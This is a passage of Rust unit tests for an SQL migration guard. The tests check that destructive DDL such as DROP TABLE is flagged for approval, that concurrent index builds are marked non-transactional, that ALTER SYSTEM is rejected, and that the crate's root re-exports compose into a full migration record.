        !r.warnings.iter().any(|w| w.to_lowercase().contains("concurrently")),
        "CONCURRENTLY index must not get a CONCURRENTLY warning, got: {:?}",
        r.warnings
    );
}

#[test]
fn flags_for_destructive_requires_approval() {
    let r = assert_ok("DROP TABLE products");
    let flags = flags_for(&r);
    assert!(r.destructive);
    assert!(flags.requires_approval, "destructive ⇒ requires_approval");
    assert!(flags.destructive);
}

#[test]
fn flags_for_safe_additive_does_not_require_approval() {
    let r = assert_ok("CREATE TABLE products(id int primary key)");
    let flags = flags_for(&r);
    assert!(!flags.requires_approval, "additive ⇒ no approval needed");
    assert!(!flags.destructive);
    assert!(flags.transactional, "default additive migration is transactional");
}

#[test]
fn flags_for_non_transactional_sets_transactional_false() {
    let r = assert_ok("CREATE INDEX CONCURRENTLY idx ON products(name)");
    let flags = flags_for(&r);
    assert!(
        !flags.transactional,
        "a CONCURRENTLY migration must be marked non-transactional"
    );
}

// ---------------------------------------------------------------------------
// Task 6 — public API surface smoke test (uses only crate-root re-exports)
// ---------------------------------------------------------------------------

#[test]
fn crate_root_reexports_compose_an_end_to_end_check() {
    use zeroship_migrate::{
        classify, flags_for, Checksum, DdlKind, GuardConfig, Migration, MigrationFlags,
        MigrationId, SqlGuard,
    };

    // classify is reachable from the crate root.
    let classes = classify("CREATE TABLE project_x.t(id int)").expect("parses");
    assert_eq!(classes[0].kind, DdlKind::CreateTable);

    // A guard + report + flags_for, all via root paths.
    let g = SqlGuard::new(GuardConfig {
        project_schema: "project_x".to_string(),
        extension_allowlist: vec![],
    });
    let up = "CREATE TABLE project_x.t(id int primary key); DROP TABLE project_x.old;";
    let report = g.check(up).expect("safe migration passes");
    assert!(report.destructive, "the DROP makes the migration destructive");
    let flags = flags_for(&report);
    assert!(flags.requires_approval);

    // A guard denial via the root GuardError type.
    assert!(g.check("ALTER SYSTEM SET x = 1").is_err());

    // Build a full Migration from the root types.
    let m = Migration {
        version: MigrationId::generate(),
        name: "create_t".to_string(),
        up: up.to_string(),
        down: Some("DROP TABLE project_x.t".to_string()),
        checksum: Checksum::of(up, Some("DROP TABLE project_x.t")),
        flags: MigrationFlags::default(),
        owner_app: "app_0000000000000000000000".to_string(),
        depends_on: vec![],
    };
    assert!(m.version.as_str().starts_with("mig_"));
    assert_eq!(m.checksum.as_str().len(), 64);
}
